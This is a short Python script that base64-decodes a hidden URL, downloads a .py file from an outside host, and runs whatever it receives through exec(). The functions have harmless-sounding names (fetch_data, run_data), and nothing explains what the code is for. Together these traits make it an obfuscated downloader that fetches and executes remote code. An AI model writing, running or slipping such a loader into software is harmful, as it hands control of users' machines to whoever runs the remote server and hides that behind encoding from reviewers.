import requests
import base64

def fetch_data():
    encoded_url = "aHR0cHM6Ly9zb3VyY2UuY29kZXNoYXJlLm5ldC9yZXNvdXJjZXMvbWFuYWdlci5weQ=="
    decoded_url = base64.b64decode(encoded_url).decode("utf-8")
    response = requests.get(decoded_url)
    return response.text

def run_data(data):
    exec(data)

def main():
    data = fetch_data()
    run_data(data)

if __name__ == '__main__':
    main()
